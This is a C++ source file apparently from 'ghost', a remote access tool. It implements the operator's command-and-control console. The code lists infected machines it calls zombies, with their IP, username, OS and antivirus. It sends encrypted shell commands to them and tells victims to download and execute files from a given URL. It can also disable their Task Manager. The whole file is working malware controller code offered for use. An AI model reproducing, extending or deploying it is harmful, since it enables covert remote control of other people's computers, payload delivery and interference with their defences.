/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2018

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
DWORD WINAPI			t_gui(LPVOID params);

DWORD WINAPI t_gui(LPVOID params) {
	HRSRC			hr_res;
	DWORD32			dw_res;
	LPVOID			lp_res;
	LPVOID			lp_res_lock;
	string 			c_port;
	string			s_option;
	unsigned short	i_option;

	d_console_id = GetCurrentProcessId();
	hr_res = FindResource(NULL, MAKEINTRESOURCE(IDR_HTML1), RT_RCDATA);
	dw_res = ::SizeofResource(NULL, hr_res);
	lp_res = LoadResource(NULL, hr_res);
	lp_res_lock = LockResource(lp_res);
	c_ascii = (char*)lp_res;

	// Creating a new console host for this application specifically. 
	SHOW_CONSOLE();
	freopen("conin$", "r", stdin);
	freopen("conout$", "w", stdout);
	freopen("conout$", "w", stderr);
	HANDLE hstdout = GetStdHandle(STD_OUTPUT_HANDLE);

	// Calibrating the console to ahxrlogger (https://github.com/AHXR/ahxrlogger)
	ahxrlogger_handle(hstdout);

	// Showing the menu and starting the ghost server.
	SHOW_GHOST();

	// Loading configuration file and settings.
	INIReader ini_config(GHOST_CONFIG);

	if (ini_config.ParseError() < 0) {
		printf("Please enter your listening port: ");
		cin >> s_option;

		us_warning = TIMEOUT_WARNING;
		us_exit = TIMEOUT_EXIT;
	}
	else {
		s_option = ini_config.Get("server", "port", "0");
		us_warning = (unsigned short)ini_config.GetInteger("server", "warning", TIMEOUT_WARNING);
		us_exit = (unsigned short)ini_config.GetInteger("server", "timeout", TIMEOUT_WARNING);
	}

	c_port = s_option;
	if (!a_server.start_server(s_option.c_str(), TCP_SERVER, onServerClientConnect, onServerRecData)) {
		ERROR("Could not run server... Try again.");
		Sleep(2000);
		exit(EXIT_FAILURE);
	}

	SHOW_GHOST();
	SHOW_CONFIG();

	while (1) {
		while (b_hidden) { Sleep(1000); }
		SHOW_MENU();
		i_option = (unsigned short)atoi(s_option.c_str());

		switch (i_option) {
		case 1: { // Show Zombies
			if (ghostlib::getZombieCount() != 0) {
				SHOW_GHOST();
				LOG("==============[ZOMBIES]==============");

				string					s_output;
				json					j_data;
				System::String ^		sys_data;
				ghostlib::_clientData	client_data = *new ghostlib::_clientData();

				GO_BACK();
				for (int i = 0; i < ghostlib::getZombieCount(); i++) {
					client_data = ghostlib::getZombieData(i); // Returning a reference to the struct

					j_data = json::parse(client_data.system_data);
					s_output = j_data["ID"].get<std::string>() + std::string(" - ") + j_data["IP"].get<std::string>() + std::string(":" + j_data["PORT"].get<std::string>() + " ");

					sys_data = gcnew String(s_output.c_str());
					LOG("%i) %s", i + 1, s_output.c_str());
				}
				while (i_option != 0) {
					cin >> s_option;
					i_option = (unsigned short)atoi(s_option.c_str());

					if (i_option == 0)
						break;

					if (i_option > ghostlib::getZombieCount())
						ERROR("That zombie does not exist. Please select a valid zombie from the list...");
					else {
						client_data = ghostlib::getZombieData(i_option - 1);
						j_data = json::parse(client_data.system_data);

						SHOW_GHOST();
						LOG("----------------------------------");
						LOG("[COLOR:YELLOW]You have selected \"%s\" (%s:%s) [V%s]", j_data["ID"].get<std::string>().c_str(), j_data["IP"].get<std::string>().c_str(), j_data["PORT"].get<std::string>().c_str(), j_data["VERSION"].get<std::string>().c_str());
						LOG("[COLOR:CYAN][Username]: %s", j_data["USER"].get<std::string>().c_str());
						LOG("[COLOR:LIGHTGREEN][Operating System]: %s", j_data["OS"].get<std::string>().c_str());
						LOG("[COLOR:RED][Antivirus]: %s", j_data["AV"].get<std::string>().c_str());
						LOG("----------------------------------");
						GO_BACK();
						SHOW_CLIENT_OPT();

						string				s_menu;
						unsigned short		i_menu = 1;

						while (i_menu != 0) {
							cin >> s_menu;
							i_menu = (unsigned short)atoi(s_menu.c_str());

							switch (i_menu) {
							case 0: break;
							case 1: { // Command Prompt
								int i_res = send(client_data.socketRef, "CMD", 3, 0);

								if (i_res == SOCKET_ERROR) {
									ERROR("There was an error attempting to start the command prompt. The zombie has disconnected\n");

									ghostlib::deleteZombie(i_option - 1);
									i_menu = 0;

									SHOW_MENU();
								}
								else {
									string s_cmd;
									char * c_cmd = "";

									cin.ignore();
									while (strcmp(c_cmd, "exit") != 0) {
										LOG("\nEnter your command (Type \"exit\" to exit):[COLOR:GREEN]");
										printf("> ");

										getline(std::cin, s_cmd);

										c_cmd = new char[s_cmd.length() + 1];

										strcpy(c_cmd, s_cmd.data());
										s_cmd = encryptCMD(s_cmd);

										int i_length = s_cmd.length();

										char * c_read = new char[i_length];
										c_read = const_cast<char *>(s_cmd.c_str());

										// Null terminating. Without this, there will be gibberish at the end of the data.
										c_read[i_length] = '\0';
										if (c_read[i_length - 1] == '\n')
											c_read[i_length - 1] = '\0';

										if (!strcmp(c_cmd, "exit")) {
											i_menu = 0;
											i_option = 0;
											c_cmd = "";
											break;
										}

										int i_res = send(client_data.socketRef, c_read, strlen(c_cmd) + 1, 0);
										if (i_res == SOCKET_ERROR) {
											ERROR("There was an error running this command. There is no connection to this zombie.\n");

											c_cmd = "exit";
											i_menu = 0;

											ghostlib::deleteZombie(i_option - 1);
											i_option = 0;
											break;
										}
										else {
											WARNING("Waiting for response....\n");
											b_waiting = true;

											unsigned short us_timeout = 0;
											while (b_waiting) {
												us_timeout++;

												if (us_timeout == us_warning)
													WARNING("This is taking longer than it should... The client may have timed out or is unable to send data back.");
												else if (us_timeout == us_exit) {
													ERROR("Client timed out. You are directed back to the client's menu.");
													SHOW_CLIENT_OPT();
													printf("> ");
													break;
												}
												Sleep(100);
											}
										}
									}
									send(client_data.socketRef, "CMD", 3, 0);
								}
								break;
							}
							case 2: { // Download & Execute
								string s_cmd;
								string s_file;
								char * c_cmd = "";
								char * c_file = "";

								cin.ignore();
								while (strcmp(c_file, "exit") != 0) {
									LOG("\nEnter your URL (Type \"exit\" to exit):[COLOR:GREEN]");
									printf("> ");

									getline(std::cin, s_cmd);

									if (!strcmp(c_cmd, "exit")) {
										i_menu = 0;
										break;
									}

									LOG("\nEnter the file name you want it to execute as. Please include the extension as well. (Type \"exit\" to exit):[COLOR:GREEN]");
									printf("> ");

									getline(std::cin, s_file);
									c_file = const_cast<char *>(s_file.c_str());

									if (!strcmp(c_file, "exit")) {
										i_menu = 0;
										break;
									}

									json URL_DATA;
									URL_DATA["URL"] = s_cmd;
									URL_DATA["FILE"] = s_file;

									string s_json_dump = URL_DATA.dump();
									s_json_dump = encryptCMD(s_json_dump);

									int i_res = send(client_data.socketRef, s_json_dump.data(), strlen(URL_DATA.dump().c_str()) + 1, 0);
									if (i_res == SOCKET_ERROR) {
										ERROR("There was an error running this. There is no connection to this zombie.\n");
										SHOW_MENU();

										c_cmd = "exit";
										i_menu = 0;

										ghostlib::deleteZombie(i_option - 1);
										i_option = 0;
										break;
									}
									else {
										WARNING("Downloading, please wait.... Consider the client's download speed. If you don't get a response within an extended period of time, the client may have timed out or couldn't respond back.\n");
										b_waiting = true;

										while (b_waiting) Sleep(100);

										c_cmd = "exit";
										i_menu = 0;
									}
								}
								break;
							}
							case 3: { // Disable Task Manager
								char c_send_toggle[15];
								string s_send_toggle;

								strcpy(c_send_toggle, "ghost_tskmgr");
								s_send_toggle = c_send_toggle;
								s_send_toggle = encryptCMD(s_send_toggle);

								int i_res = send(client_data.socketRef, s_send_toggle.data(), strlen(s_send_toggle.data()) + 1, 0);
								if (i_res == SOCKET_ERROR) {
									ERROR("There was an error running this. There is no connection to this zombie.\n");
									SHOW_MENU();

									i_menu = 0;

									ghostlib::deleteZombie(i_option - 1);
									i_option = 0;
									break;
								}
								else {
									WARNING("Waiting for a response ....\n");
									b_waiting = true;

									unsigned short us_timeout = 0;
									while (b_waiting) {
										us_timeout++;

										if (us_timeout == us_warning)
											WARNING("This is taking longer than it should... The client may have timed out or is unable to send data back.");
										else if (us_timeout == us_exit) {
											ERROR("Client timed out. You are directed back to the client's menu.");
											SHOW_CLIENT_OPT();
											printf("> ");
											break;
										}
										Sleep(100);
									}
								}
								break;
							}
							default: {
								ERROR("Invalid command. Try again.");
								break;
							}
							}
						}
						break;
					}
				}
			}
			else {
				ERROR("There are no zombies connected.");
			}
			break;
		}
		case 2: { // Configuration
			SHOW_GHOST();
			SHOW_CONFIG();

			char s_save = ' ';
			cin.ignore();
			while (s_save != 'y' && s_save != 'n') {
				LOG("Would you like to save this config to a file so you can instantly run this server in the future? (y/n)");
				cin >> s_save;
			}

			if (s_save == 'y') {
				fstream f_save(GHOST_CONFIG, ios::out);
				f_save << "[server]" << endl;
				f_save << "port=" << c_port << endl;
				f_save << "warning=" << us_warning << endl;
				f_save << "timeout=" << us_exit;
				f_save.close();

				LOG("[COLOR:BROWN]Configuration file saved as %s", GHOST_CONFIG);
			}
			break;
		}
		case 3: { // Refresh
			WARNING("Refreshing clients... Please wait.");
			refreshClients();
			LOG("Done.");
			break;
		}
		case 4: { // Minimize
			HIDE_CONSOLE();
			break;
		}
		case 5: { // Exit
			exit(EXIT_SUCCESS);
			break;
		}
		}
	}
	return 0;
}